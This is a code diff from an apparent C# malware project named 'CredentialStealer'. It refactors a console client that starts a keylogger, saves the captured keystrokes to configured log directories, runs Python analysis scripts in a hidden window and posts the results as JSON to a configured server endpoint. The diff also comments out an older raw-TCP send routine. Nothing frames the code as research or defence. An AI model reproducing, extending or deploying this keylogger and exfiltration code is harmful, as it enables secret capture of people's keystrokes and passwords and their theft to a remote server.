@@ -1,4 +1,4 @@
-﻿using CredentialStealer.Entities;
+using CredentialStealer.Entities;
 using CredentialStealer.KeyboardRecorder;
 using Newtonsoft.Json;
 using System;
@@ -14,76 +14,75 @@ namespace CredentialStealer.Client.Console
 {
     public class Client
     {
-        private const int PORT = 5000;
-        private const string IP = "127.0.0.1";
-        private const string EOF = "<EOF>";
-        private const int RETRY_DELAY = 5000;
-        
-        public static byte[] read(NetworkStream clientStream, Encoding encoder)
-        {
-            byte[] result = new byte[0];
-            int tokenSize = Convert.ToBase64String(encoder.GetBytes(EOF)).Length;
-            while (true)
-            {
-                byte[] message = new byte[4096];
-                int bytesRead = 0;
-                try
-                {
-                    bytesRead = clientStream.Read(message, 0, 4096);
-                }
-                catch (Exception exception)
-                {
-                    System.Console.WriteLine(exception);
-                    break;
-                }
-                if (bytesRead == 0)
-                {
-                    return result;
-                }
-                Array.Resize<byte>(ref result, result.Length + bytesRead);
-                Array.Copy(message, 0, result, result.Length - bytesRead, bytesRead);
-                if (encoder.GetString(result).EndsWith(EOF))
-                {
-                    break;
-                }
-            }
-            int eofLength = encoder.GetBytes(EOF).Length;
-            byte[] truncatedResult = new byte[result.Length - eofLength];
-            Array.Copy(result, 0, truncatedResult, 0, truncatedResult.Length);
-            return truncatedResult;
-        }
+        //private const int PORT = 5000;
+        //private const string IP = "127.0.0.1";
+        //private const string EOF = "<EOF>";
+        // private const int RETRY_DELAY = 5000;
 
-        public static void write(NetworkStream clientStream, Encoding encoder, byte[] buffer)
-        {
-            byte[] plainBuffer = Utils.Utils.ConcatenateBytes(buffer, encoder.GetBytes(EOF));
-            clientStream.Write(plainBuffer, 0, plainBuffer.Length);
-            clientStream.Flush();
-        }
+        //public static byte[] read(NetworkStream clientStream, Encoding encoder)
+        //{
+        //    byte[] result = new byte[0];
+        //    int tokenSize = Convert.ToBase64String(encoder.GetBytes(EOF)).Length;
+        //    while (true)
+        //    {
+        //        byte[] message = new byte[4096];
+        //        int bytesRead = 0;
+        //        try
+        //        {
+        //            bytesRead = clientStream.Read(message, 0, 4096);
+        //        }
+        //        catch (Exception exception)
+        //        {
+        //            System.Console.WriteLine(exception);
+        //            break;
+        //        }
+        //        if (bytesRead == 0)
+        //        {
+        //            return result;
+        //        }
+        //        Array.Resize<byte>(ref result, result.Length + bytesRead);
+        //        Array.Copy(message, 0, result, result.Length - bytesRead, bytesRead);
+        //        if (encoder.GetString(result).EndsWith(EOF))
+        //        {
+        //            break;
+        //        }
+        //    }
+        //    int eofLength = encoder.GetBytes(EOF).Length;
+        //    byte[] truncatedResult = new byte[result.Length - eofLength];
+        //    Array.Copy(result, 0, truncatedResult, 0, truncatedResult.Length);
+        //    return truncatedResult;
+        //}
 
-        public void SendInfosToMyServer(string content,IPEndPoint serverEndPoint)
-        {
+        //public static void write(NetworkStream clientStream, Encoding encoder, byte[] buffer)
+        //{
+        //    byte[] plainBuffer = Utils.Utils.ConcatenateBytes(buffer, encoder.GetBytes(EOF));
+        //    clientStream.Write(plainBuffer, 0, plainBuffer.Length);
+        //    clientStream.Flush();
+        //}
 
-            TcpClient client = new TcpClient();
-            client.Connect(serverEndPoint);
-            NetworkStream nwStream = client.GetStream();
-            ASCIIEncoding encoder = new ASCIIEncoding();
+        //public void SendInfosToMyServer(string content,IPEndPoint serverEndPoint)
+        //{
+        //        TcpClient client = new TcpClient();
+        //        client.Connect(serverEndPoint);
+        //        NetworkStream nwStream = client.GetStream();
+        //        ASCIIEncoding encoder = new ASCIIEncoding();
 
 
-            string textToSend = "echo";
-            byte[] bytesToSend = ASCIIEncoding.ASCII.GetBytes(textToSend);
+        //        string textToSend = "echo";
+        //        byte[] bytesToSend = ASCIIEncoding.ASCII.GetBytes(textToSend);
 
-            //---send the text---
-            System.Console.WriteLine("Sending : " + textToSend);
-            //nwStream.Write(bytesToSend, 0, bytesToSend.Length);
+        //        //---send the text---
+        //        System.Console.WriteLine("Sending : " + textToSend);
+        //        //nwStream.Write(bytesToSend, 0, bytesToSend.Length);
 
-            Client.write(nwStream, encoder, encoder.GetBytes("Echo"));
-            System.Console.WriteLine(encoder.GetString(read(nwStream, encoder)));
-            client.Close(); 
-        }
+        //        Client.write(nwStream, encoder, encoder.GetBytes("Echo"));
+        //        System.Console.WriteLine(encoder.GetString(read(nwStream, encoder)));
+        //        client.Close(); 
+        //}
 
         public static string SendInfosToServer(string content)
         {
-            IPEndPoint serverEndPoint = new IPEndPoint(IPAddress.Parse(IP), PORT);
+            //IPEndPoint serverEndPoint = new IPEndPoint(IPAddress.Parse(IP), PORT);
             string result = null;
             var httpWebRequest = (HttpWebRequest)WebRequest.Create(System.Configuration.ConfigurationManager.AppSettings["ServerEndPoint"]);
             httpWebRequest.ContentType = "application/json";
@@ -126,15 +125,16 @@ namespace CredentialStealer.Client.Console
             SendInfosToServer(content);
         }
 
-        private static void ExecutePythonScripts(string fileName)
+        private static void ExecutePythonScripts(string inputFileName)
         {
+            string outputFileName = Path.Combine(System.Configuration.ConfigurationManager.AppSettings["LogSniffAnalysedDir"], Path.GetFileName(inputFileName));
             // Use ProcessStartInfo class
             ProcessStartInfo startInfo = new ProcessStartInfo();
             startInfo.CreateNoWindow = false;
             startInfo.UseShellExecute = false;
-            startInfo.FileName = fileName;
+            startInfo.FileName = inputFileName;
             startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-            startInfo.Arguments = String.Format("{0}",fileName);
+            startInfo.Arguments = String.Format("{0} {1}", inputFileName, outputFileName);
 
             try
             {
@@ -146,9 +146,9 @@ namespace CredentialStealer.Client.Console
                     //exeProcess.WaitForExit();
                 }
             }
-            catch
+            catch (Exception ex)
             {
-                // Log error.
+                throw ex;
             }
         }
         public Client()
@@ -191,26 +191,27 @@ namespace CredentialStealer.Client.Console
         {
             try
             {
-                
-                if (!System.IO.Directory.Exists(System.Configuration.ConfigurationManager.AppSettings["LogSniffSrcDir"]))
+
+                string logSniffSrcDir = System.Configuration.ConfigurationManager.AppSettings["LogSniffSrcDir"];
+                string logSniffDestDir = System.Configuration.ConfigurationManager.AppSettings["LogSniffDestDir"];
+                string logSniffAnalysedDir = System.Configuration.ConfigurationManager.AppSettings["LogSniffAnalysedDir"];
+
+
+                if (!System.IO.Directory.Exists(logSniffSrcDir))
                 {
-                    System.IO.Directory.CreateDirectory(System.Configuration.ConfigurationManager.AppSettings["LogSniffSrcDir"]);
+                    System.IO.Directory.CreateDirectory(logSniffSrcDir);
                 }
 
-                if (!System.IO.Directory.Exists(System.Configuration.ConfigurationManager.AppSettings["LogSniffDestDir"]))
+                if (!System.IO.Directory.Exists(logSniffDestDir))
                 {
-                    System.IO.Directory.CreateDirectory(System.Configuration.ConfigurationManager.AppSettings["LogSniffDestDir"]);
-                }
-                if (!System.IO.Directory.Exists(System.Configuration.ConfigurationManager.AppSettings["LogSniffSrcDir"]))
-                {
-                    System.IO.Directory.CreateDirectory(System.Configuration.ConfigurationManager.AppSettings["LogSniffSrcDir"]);
+                    System.IO.Directory.CreateDirectory(logSniffDestDir);
                 }
 
-                if (!System.IO.Directory.Exists(System.Configuration.ConfigurationManager.AppSettings["LogSniffAnalysedDir"]))
+                if (!System.IO.Directory.Exists(logSniffAnalysedDir))
                 {
-                    System.IO.Directory.CreateDirectory(System.Configuration.ConfigurationManager.AppSettings["LogSniffAnalysedDir"]);
+                    System.IO.Directory.CreateDirectory(logSniffAnalysedDir);
                 }
-                KeyLogger kl = new KeyLogger("keylogging", @"C:\ITC\log_src", @"C:\ITC\log_dest");
+                KeyLogger kl = new KeyLogger("keylogging", logSniffSrcDir, logSniffDestDir);
                 while (true)
                 {
                     Application.DoEvents();
